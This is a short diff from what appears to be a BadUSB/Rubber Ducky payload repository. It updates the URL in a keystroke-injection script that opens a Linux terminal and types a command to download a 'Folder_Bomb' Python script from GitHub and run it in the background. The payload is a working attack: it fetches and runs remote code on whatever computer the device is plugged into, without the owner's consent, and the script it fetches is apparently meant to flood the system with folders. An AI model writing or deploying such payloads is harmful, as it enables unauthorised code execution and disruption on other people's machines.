@@ -12,6 +12,6 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Folder_Bomb/PLTUX.py && python3 PLTUX.py &
+STRING nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/Folder_Bomb/PLTUX.py && python3 PLTUX.py &
 DELAY 500
 ALT F4
